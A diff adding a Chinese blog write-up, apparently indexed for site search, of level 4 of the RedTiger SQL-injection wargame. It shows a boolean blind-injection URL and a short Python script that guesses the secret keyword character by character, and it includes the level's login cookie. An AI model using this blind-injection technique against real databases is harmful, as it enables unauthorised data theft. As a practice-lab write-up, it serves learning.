@@ -4,6 +4,19 @@
   
     
     <entry>
+      <title>redtiger_forth</title>
+      <link href="2021/01/17/redtiger-forth/"/>
+      <url>2021/01/17/redtiger-forth/</url>
+      
+        <content type="html"><![CDATA[<h1 id="redtiger-forth"><a href="#redtiger-forth" class="headerlink" title="redtiger_forth"></a>redtiger_forth</h1><p>Target: Get the value of the first entry in table level4_secret in column keyword<br>Disabled: like<br>看题目是布尔注入<br>随便输入一些东西，指挥返回0和1</p><p>这就去学习了一下布尔类型的sql注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;redtiger.labs.overthewire.org&#x2F;level4.php?id&#x3D;1 and 1&#x3D;(select length(keyword)&#x3D;21 from level4_secret)</span><br></pre></td></tr></table></figure><p>构造出来一个url</p><p>然后看了一下大佬的wp<br>写一个简单的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">keword=<span class="string">&#x27;&#x27;</span></span><br><span class="line">char=string.printable</span><br><span class="line">url=<span class="string">&#x27;http://redtiger.labs.overthewire.org/level4.php?id=1 and 1=(select ascii(substr((select keyword from level4_secret),&#123;0&#125;,1))=&#123;1&#125;)&#x27;</span></span><br><span class="line">cookie=&#123;<span class="string">&#x27;level4login&#x27;</span>:<span class="string">&#x27;there_is_no_bug&#x27;</span>&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">22</span>):</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> char:</span><br><span class="line">        test=url.<span class="built_in">format</span>(i,<span class="built_in">ord</span>(c))</span><br><span class="line">        r=requests.get(test,cookies=cookie)</span><br><span class="line">        <span class="keyword">if</span> re.findall(<span class="string">&#x27;Query returned 1 rows.&#x27;</span>,r.text):</span><br><span class="line">            <span class="built_in">print</span> i,c</span><br><span class="line">            keword+=c</span><br><span class="line"><span class="built_in">print</span> keword</span><br></pre></td></tr></table></figure><blockquote><p>得到flag！</p></blockquote>]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>redtiger_third</title>
       <link href="2021/01/16/redtiger-third/"/>
       <url>2021/01/16/redtiger-third/</url>
